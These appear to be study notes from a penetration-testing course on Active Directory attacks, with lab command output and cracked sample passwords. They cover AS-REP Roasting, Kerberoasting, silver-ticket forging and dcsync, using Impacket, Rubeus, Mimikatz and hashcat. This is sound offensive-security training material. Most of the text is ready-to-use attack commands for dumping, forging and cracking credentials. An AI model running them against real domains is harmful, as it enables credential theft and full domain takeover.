+ For this example, we'll use _pete_ with the password _Nexus123!_ from the previous section
+ The complete command is shown below, and will return users vulnerable to AS-REP Roasting:
```
impacket-GetNPUsers -dc-ip <DC_IP>  -request -outputfile <HASH_OUT> <DOMAIN>/<USER>
```
+ Example:
```
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
```
+ Above shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting

By default, the resulting hash format of `impacket-GetNPUsers` is compatible with Hashcat
+ Therefore, let's check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help
```
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```
+ The output of the grep command in listing 15 shows that the correct mode for AS-REP is _18200_

We've now collected everything we need to launch Hashcat and crack the AS-REP hash
+ Let's enter the mode **18200**, the file containing the AS-REP hash, **rockyou.txt** as wordlist, **best64.rule** as rule file, and **--force** to perform the cracking on our Kali VM
```
sudo hashcat -m 18200 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
+ Example output:
```
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
...
```
+ Hashcat successfully cracked the AS-REP hash
+ Above shows that the user _dave_ has the password _Flowers1_
+ **NOTE**: If you receive the Hashcat error "Not enough allocatable device memory for this attack", shut down your Kali VM and add more RAM to it. 4GB is enough for the examples and exercises of this Module

As mentioned, we can also perform AS-REP Roasting on Windows
+ We'll use _Rubeus_, which is a toolset for raw Kerberos interactions and abuses
+ To perform this attack, we'll connect to CLIENT75 via RDP as domain user _jeff_ with the password _HenchmanPutridBonbon11_
+ Next, we can start a PowerShell window and navigate to **C:\Tools**, where **Rubeus.exe** can be found

#### AS-REP Roasting With Rubeus on Windows
Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except **asreproast**
+ Rubeus will automatically identify vulnerable user accounts
+ We also add the flag **/nowrap** to prevent new lines being added to the resulting AS-REP hashes
```
.\Rubeus.exe asreproast /nowrap
```
+ Example:
```
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```
+ Above shows that Rubeus identified _dave_ as vulnerable to AS-REP Roasting and displays the AS-REP hash

Next, let's copy the AS-REP hash and paste it into a text file named **hashes.asreproast2** in the home directory of user _kali_
+ We can now start Hashcat again to crack the AS-REP hash:
```
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
...
```
+ Hashcat successfully cracked the AS-REP hash

To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows
```
Get-DomainUser -PreauthNotRequired
```

On Kali, we can use _impacket-GetNPUsers_ as shown before without the **-request** and **-outputfile** options:
```
impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USER>
```

Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option _Do not require Kerberos preauthentication_ enabled
+ While enumerating, we notice that we have _GenericWrite_ or _GenericAll_ permissions on another AD user account
+ Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account
+ We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication
+ This attack is known as _Targeted AS-REP Roasting_
+ Notably, we should reset the User Account Control value of the user once we've obtained the hash
+ Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
```
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

In this section, we first explored the theory behind AS-REP Roasting. We then performed this attack on Kali with impacket-GetNPUsers and on Windows with Rubeus
+ In the next section, we'll perform a similar attack, but instead of abusing a missing Kerberos preauthentication, we'll target SPNs

### Kerberoasting
Let's recall how the Kerberos protocol works
+ We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller
+ The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN

When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN
+ These checks are performed as a second step only when connecting to the service itself
+ This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller

The service ticket is encrypted using the SPN's password hash
+ If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account
+ This technique is known as _Kerberoasting_

In this section, we will abuse a service ticket and attempt to crack the password of the service account
+ Let's begin by connecting to CLIENT75 via RDP as _jeff_ with the password _`HenchmanPutridBonbon11`_

#### Kerberoasting With Rubeus on Windows
To perform Kerberoasting, we'll use Rubeus again
+ We specify the **kerberoast** command to launch this attack technique
+ In addition, we'll provide **hashes.kerberoast** as an argument for **/outfile** to store the resulting TGS-REP hash in
+ Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user
```
.\Rubeus.exe kerberoast /outfile:<OUTFILE>
```
+ Example:
```
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```
+ Above shows that Rubeus identified one user account vulnerable to Kerberoasting and wrote the hash to an output file

Now, let's copy **hashes.kerberoast** to our Kali machine
+ We can then review the Hashcat help for the correct mode to crack a TGS-REP hash
```
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```
+ The output of the second command above shows that _13100_ is the correct mode to crack TGS-REP hashes

As in the previous section, we'll start Hashcat with the arguments **13100** as mode, **rockyou.txt** as wordlist, **best64.rule** as rule file, and **--force** as we perform the cracking in a VM:
```
sudo hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
+ Example:
```
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
```
+ We successfully retrieved the plaintext password of the user _iis_service_ by performing Kerberoasting

#### Kerberoasting With Impacket on Linux
Next, let's perform Kerberoasting from Linux
+ We can use _`impacket-GetUserSPNs`_ with the IP of the domain controller as the argument for **-dc-ip**
+ Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash
+ As before, we can use **-request** to obtain the TGS and output them in a compatible format for Hashcat
```
sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>
```
+ Example:
```
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```
+ Above shows that we successfully obtained the TGS-REP hash
+ **NOTE**: If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. 
	+ We can use _ntpdate_ or _rdate_ to do so

Now, let's store the TGS-REP hash in a file named **hashes.kerberoast2** and crack it with Hashcat as we did before:
```
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec
...
a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba565aa97941ccfd634b:Strawberry1
...
```
+ Above shows that we could successfully crack the TGS-REP hash again, providing the same plaintext password as before

This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations
+ However, if the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible
+ The same is true for the _krbtgt_ user account which acts as service account for the KDC
+ Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher

Let's assume that we are performing an assessment and notice that we have _GenericWrite_ or _GenericAll_ permissions on another AD user account
+ As stated before, we could reset the user's password but this may raise suspicion
+ However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named _targeted Kerberoasting_
+ We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure
+ We've now covered how an SPN can be abused to obtain a TGS-REP hash and how to crack it 

PowerShell command to give a victim an SPN and clean up:
``` Powershell
# Make sur that the target account has no SPN
Get-DomainUser 'victimuser' | Select serviceprincipalname

# Set the SPN
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

### Silver Tickets
In the previous section, we obtained and cracked a TGS-REP hash to retrieve the plaintext password of an SPN
+ In this section, we'll go one step further and forge our own service tickets

See how a patched version does verification with the DC (PAC)
![[Pasted image 20240105154452.png]]
+ VS a silver ticket:
![[Pasted image 20240105154707.png]]

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket
+ However, the user and group permissions in the service ticket are not verified by the application in a majority of environments
+ In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller

_Privileged Account Certificate_ (PAC) validation is an optional verification process between the SPN application and the domain controller
+ If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller
+ Fortunately for this attack technique, service applications rarely perform PAC validation

As an example, if we authenticate against an IIS server that is executing in the context of the service account _iis_service_, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket
+ With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire
+ This custom-created ticket is known as a _silver ticket_ and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all

In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource
+ As we identified in the previous section, the _iis_service_ user account is mapped to an HTTP SPN
+ Therefore, the password hash of the user account is used to create service tickets for it 
+ For the purposes of this example, let's assume we've identified that the _iis_service_ user has an established session on CLIENT75

In general, we need to collect the **following three pieces of information to create a silver ticket**:
1. SPN password hash
2. Domain SID
3. Target SPN

Let's get straight into the attack by connecting to CLIENT75 via RDP as _jeff_ with the password _`HenchmanPutridBonbon11`_
+ First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped to _iis_service_
+ To do so, we'll use **`iwr`** and enter **`-UseDefaultCredentials`** so that the credentials of the current user are used to send the web request
```
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error

  401 - Unauthorized: Access is denied due to invalid credentials.
  You do not have permission to view this directory or page using the credentials that you supplied.

At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```
+ Above shows that we cannot access the web page as _jeff_
+ Let's start collecting the information needed to forge a silver ticket

Since we are a local Administrator on this machine where _iis_service_ has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of _iis_service_), which is the first piece of information we need to create a silver ticket
+ Let's start PowerShell as Administrator and launch Mimikatz
+ As we already learned, we can use **privilege::debug** and **sekurlsa::logonpasswords** to extract cached AD credentials
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```
+ Above shows the password hashes of the _iis_service_ user account
+ The NTLM hash of the service account is the first piece of information we need to create the silver ticket

Now, let's obtain the domain SID, the second piece of information we need
+ We can enter **`whoami /user`** to get the SID of the current user
+ Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain

As covered in the _Windows Privilege Escalation_ Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user
```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
+ So if the whole SID is `S-1-5-21-1987370270-658905905-1781884369-1105`, the domain SID is `S-1-5-21-1987370270-658905905-1781884369`

The last list item is the target SPN (Service Principle Name)
+ For this example, we'll target the HTTP SPN resource on WEB04 (_`HTTP/web04.corp.com:80`_) because we want to access the web page running on IIS

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz
+ We can create the forged service ticket with the _kerberos::golden_ module
+ This module provides the capabilities for creating golden and silver tickets alike
+ We'll explore the concept of golden tickets in the Module _Lateral Movement in Active Directory_

We need to provide the domain SID (**`/sid:`**), domain name (**`/domain:`**), and the target where the SPN runs (**`/target:`**)
+ We also need to include the SPN protocol (**/service:**), NTLM hash of the SPN (**/rc4:**), and the **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on
+ Finally, we must enter an existing domain user for **`/user:`**. This user will be set in the forged ticket
+ For this example, we'll use _`jeffadmin`_, however, we could also use any other domain user since we can set the permissions and groups ourselves
+ The complete command usage:
```
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGET_MACHINE> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER>
```
+ Example:
```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

A new service ticket for the SPN _HTTP/web04.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket
+ From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group ( _Relative Id: 512_ ) as highlighted above
+ This means we should have the ticket ready to use in memory, can confirm this with **`klist`**
```
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```
+ Above shows that we have the silver ticket for _jeffadmin_ to access _http/web04.corp.com_ submitted to our current session
+ This should allow us to access the web page on WEB04 as _`jeffadmin`_

Let's verify our access using the same command as before:
```
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
Forms             :
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
                    text/html]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        :
RawContentLength  : 703
```

Great! We successfully forged a service ticket and got access to the web page as _jeffadmin_
+ It's worth noting that we performed this attack without access to the plaintext password or password hash of this user

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions
+ This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN

Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure
+ With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller
+ This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain
+ Without this patch, we could create silver tickets for domain users that do not exist
+ The updates from this patch are enforced from October 11, 2022

In this section, we learned how to forge service tickets by using the password hash of a target SPN
+ While we used an SPN run by a user account in the example, we could do the same for SPNs run in the context of a machine account

### Domain Controller Synchronization (dcsync)
In production environments, domains typically rely on more than one domain controller to provide redundancy
+ The _Directory Replication Service_ (DRS) Remote Protocol uses _replication_ to synchronize these redundant domain controllers
+ A domain controller may request an update for a specific object, like an account, using the _IDL_DRSGetNCChanges_ API

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller
+ Instead, it only verifies that the associated SID has appropriate privileges
+ If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights
+ By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a _dcsync_ attack in which we impersonate a domain controller
+ This allows us to request any user credentials from the domain

To perform this attack, we'll use Mimikatz on a domain-joined Windows machine, and _impacket-secretsdump_ on our non-domain joined Kali machine for the examples of this section

Let's begin with Mimikatz and start by connecting to CLIENT75 as _jeffadmin_ with the password _`BrouhahaTungPerorateBroom2023!`_
+ As _jeffadmin_ is a member of the _Domain Admins_ group, we already have the necessary rights assigned

#### dcsync on Windows with Mimikatz 
Once connected via RDP, let's open a PowerShell window and launch Mimikatz in **`C:\Tools`**
+ For Mimikatz to perform this attack, we can use the **`lsadump::dcsync`** module and provide the domain username for which we want to obtain credentials as an argument for **`/user:`**
+ For the purposes of this example, we'll target the domain user _dave_ 
```
lsadump::dcsync /user:<DOMAIN>\<USER>
```
+ Example:
```

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...
```
+ Mimikatz performed the dcsync attack by impersonating a domain controller and obtained the user credentials of _dave_ by using replication

Now, let's copy the NTLM hash and store it in a file named **hashes.dcsync** on our Kali system
+ We can then crack the hash using Hashcat as we learned in the _Password Attacks_ Module
+ We'll enter **1000** as mode, **rockyou.txt** as wordlist, and **best64.rule** as rule file
+ Additionally, we will enter the file containing the NTLM hash and **--force**, since we run Hashcat in a VM
```
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1              
...
```
+ Above shows that we successfully retrieved the plaintext password of _dave_

We can now obtain the NTLM hash of any domain user account of the domain **corp.com**
+ Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these accounts
+ Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator _Administrator_
```
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```
+ We'll discuss lateral movement vectors such as leveraging NTLM hashes obtained by dcsync in the Module _Lateral Movement in Active Directory_

#### dcsync on Linux with Impacket 
For now, let's perform the dcsync attack from Linux as well
+ We'll use impacket-secretsdump to acheive this
+ To launch it, we'll enter the target username **dave** as an argument for **-just-dc-user** and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format **domain/user:password@ip**
```
impacket-secretsdump -just-dc-user <USER_BEING_ATTACKED> <DOMAIN>/<CREDENTIALED_USER>:"<PASSWORD>"@<DC-IP>
```
+ Example:
```
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```
+ Above shows that we successfully obtained the NTLM hash of _dave_
+ The output of the tool states that it uses _DRSUAPI_, the Microsoft API implementing the Directory Replication Service Remote Protocol
+ Note that the NTLM has is the last `:<NTLM>::`

The dcsync attack is a powerful technique to obtain any domain user credentials
+ As a bonus, we can use it from both Windows and Linux
